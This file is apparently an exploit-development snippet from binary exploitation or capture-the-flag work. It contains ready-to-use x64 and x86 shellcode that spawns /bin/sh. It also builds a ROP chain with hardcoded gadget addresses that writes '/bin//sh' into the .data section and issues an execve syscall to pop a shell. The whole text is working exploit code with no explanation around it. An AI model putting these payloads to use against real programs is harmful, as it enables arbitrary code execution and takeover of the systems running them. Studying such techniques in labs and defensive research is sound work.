# 24 bytes shellcode
shell_x64 = '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
shell_x86 = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
#######################

# rop chain to pop shell on x64
pop_rdi_ret = 0x0000000000400696
pop_rax_ret = 0x00000000004163f4
pop_rsi_ret = 0x0000000000410ca3
syscall = 0x000000000040137c
free_space = 0x6b7000                # found in .data section, to write /bin//sh
pop_rdx_ret = 0x000000000044a6b5
bin_sh = 0x68732f2f6e69622f          # string to QWORD /bin//sh 
mov_rdi_rsi_ret = 0x0000000000447d7b # mov qword ptr [rdi], rsi ; ret

payload += p64(pop_rsi_ret)
payload += p64(bin_sh)
payload += p64(pop_rdi_ret)
payload += p64(free_space)
payload += p64(mov_rdi_rsi_ret) 
payload += p64(pop_rdx_ret)
payload += p64(0)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(0x3b)
payload += p64(syscall)
####################################
